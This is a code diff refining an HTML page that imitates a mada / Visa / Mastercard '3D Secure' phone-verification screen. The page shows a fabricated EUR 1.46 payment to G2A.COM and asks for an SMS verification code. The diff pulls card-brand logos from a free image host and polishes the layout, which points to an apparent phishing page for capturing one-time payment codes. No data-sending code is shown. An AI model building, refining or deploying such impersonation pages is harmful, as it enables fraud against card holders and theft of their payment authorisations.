@@ -3,145 +3,195 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>3D Secure Verification</title>
     <style>
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             background-color: #ffffff;
             margin: 0;
-            padding: 15px;
+            padding: 20px;
             color: #000;
+            display: flex;
+            justify-content: center;
         }
-        .wrapper {
-            max-width: 450px;
-            margin: 0 auto;
+
+        .container {
+            width: 100%;
+            max-width: 400px;
         }
-        /* Header Section */
-        .top-nav {
+
+        /* الجزء العلوي - كلمة Cancel */
+        .cancel-link {
             text-align: right;
-            font-weight: bold;
             font-size: 14px;
+            font-weight: 600;
             margin-bottom: 20px;
+            cursor: pointer;
         }
+
+        /* منطقة الشعارات */
         .header-logos {
             display: flex;
             justify-content: space-between;
-            align-items: flex-start;
-            margin-bottom: 5px;
+            align-items: flex-end;
+            margin-bottom: 8px;
         }
-        .mada-logo {
-            color: #007bc3;
-            font-weight: bold;
-            font-size: 20px;
-            letter-spacing: -1px;
+
+        .mada-logo img {
+            height: 22px; /* مقاس صغير متناسق */
+            width: auto;
         }
-        .card-logos {
+
+        .card-logos-wrapper {
             text-align: right;
-            font-size: 10px;
-            color: #666;
-            line-height: 1.2;
         }
+
+        .card-logos-wrapper img {
+            height: 18px; /* مقاس صغير للفيزا والماستر كارد */
+            width: auto;
+            display: block;
+            margin-left: auto;
+        }
+
+        .id-check-text {
+            font-size: 11px;
+            color: #444;
+            margin-top: 2px;
+        }
+
         hr {
             border: 0;
-            border-top: 1px solid #e0e0e0;
+            border-top: 1px solid #d1d1d1;
             margin: 10px 0 25px 0;
         }
-        /* Main Content */
+
+        /* النصوص الأساسية */
         h1 {
             font-family: "Times New Roman", Times, serif;
-            font-size: 24px;
-            margin-bottom: 25px;
+            font-size: 22px;
+            font-weight: bold;
+            margin: 0 0 20px 0;
         }
+
         p {
-            font-size: 16px;
-            line-height: 1.5;
-            margin-bottom: 20px;
+            font-size: 15px;
+            line-height: 1.4;
+            margin-bottom: 18px;
         }
-        /* Form Section */
-        .form-container {
+
+        .transaction-details {
+            font-weight: normal;
+        }
+
+        /* حقل الإدخال والزر */
+        .form-section {
             text-align: center;
-            margin-top: 40px;
+            margin-top: 45px;
         }
-        .label {
-            color: #888;
-            font-size: 14px;
-            margin-bottom: 8px;
+
+        .input-label {
             display: block;
+            font-size: 14px;
+            color: #757575;
+            margin-bottom: 8px;
         }
+
         input[type="text"] {
             width: 100%;
-            max-width: 320px;
-            height: 45px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
+            max-width: 300px;
+            height: 40px;
+            border: 1px solid #bcbcbc;
+            border-radius: 2px;
             font-size: 18px;
-            margin-bottom: 30px;
-            padding: 0 10px;
-            box-sizing: border-box;
+            text-align: center;
+            margin-bottom: 25px;
+            outline: none;
         }
+
         .confirm-btn {
             width: 100%;
-            background-color: #0000ff;
+            background-color: #0000FF; /* اللون الأزرق الصريح */
             color: white;
             border: none;
-            padding: 15px;
+            padding: 14px;
             font-size: 16px;
             font-weight: bold;
             border-radius: 2px;
             cursor: pointer;
-            margin-bottom: 40px;
+            text-transform: uppercase;
         }
-        .resend {
-            color: #0000ff;
+
+        .resend-code {
+            display: block;
+            margin-top: 40px;
+            color: #0000FF;
             text-decoration: none;
             font-weight: bold;
             font-size: 14px;
-            display: block;
-            margin-bottom: 60px;
+            margin-bottom: 50px;
         }
-        /* Footer Links */
-        .footer-link {
+
+        /* الروابط السفلية */
+        .footer-nav {
+            border-top: 1px solid #f0f0f0;
+            padding-top: 10px;
+        }
+
+        .footer-item {
             display: flex;
             justify-content: space-between;
-            padding: 12px 0;
-            color: #1a237e;
+            align-items: center;
+            color: #00008B;
             text-decoration: none;
-            font-size: 15px;
-            border-bottom: 0px solid #eee;
+            font-size: 14px;
+            padding: 12px 0;
         }
-        .plus { font-size: 18px; }
+
+        .plus-icon {
+            font-size: 18px;
+            font-weight: 300;
+        }
     </style>
 </head>
 <body>
 
-<div class="wrapper">
-    <div class="top-nav">Cancel</div>
-    
+<div class="container">
+    <div class="cancel-link">Cancel</div>
+
     <div class="header-logos">
-        <div class="mada-logo">mada</div>
-        <div class="card-logos">
-            Mastercard | Visa<br>
-            <strong>ID Check</strong>
+        <div class="mada-logo">
+            <img src="https://i.ibb.co/fG2CKyhR/E01-BB971-3-E72-498-A-BEAA-004-A9098-EC7-A.png" alt="mada">
+        </div>
+        <div class="card-logos-wrapper">
+            <img src="https://i.ibb.co/sv5VB9wQ/88347052-D6-A4-4974-A56-C-FCAD68185365.png" alt="Visa Mastercard">
+            <div class="id-check-text">ID Check</div>
         </div>
     </div>
-    
+
     <hr>
 
     <h1>Verify By Phone</h1>
 
     <p>We have sent you a text message with a code to your registered mobile number.</p>
     
-    <p>You are paying <strong>G2A.COM</strong> the amount of <strong>EUR 1.46</strong> on 2026/02/15 01:54:11.</p>
+    <p class="transaction-details">
+        You are paying G2A.COM the amount of EUR 1.46 on 2026/02/15 01:54:11.
+    </p>
 
-    <div class="form-container">
-        <label class="label">Verification code</label>
-        <input type="text">
-        <button class="confirm-btn">CONFIRM</button>
-        <a href="#" class="resend">RESEND CODE</a>
+    <div class="form-section">
+        <label class="input-label">Verification code</label>
+        <input type="text" id="otp">
+        <button class="confirm-btn">Confirm</button>
+        <a href="#" class="resend-code">RESEND CODE</a>
     </div>
 
-    <div style="margin-top: 20px;">
-        <a href="#" class="footer-link">Learn more about authentication <span class="plus">+</span></a>
-        <a href="#" class="footer-link">Need some help ? <span class="plus">+</span></a>
+    <div class="footer-nav">
+        <a href="#" class="footer-item">
+            Learn more about authentication <span class="plus-icon">+</span>
+        </a>
+        <a href="#" class="footer-item">
+            Need some help ? <span class="plus-icon">+</span>
+        </a>
     </div>
 </div>
 
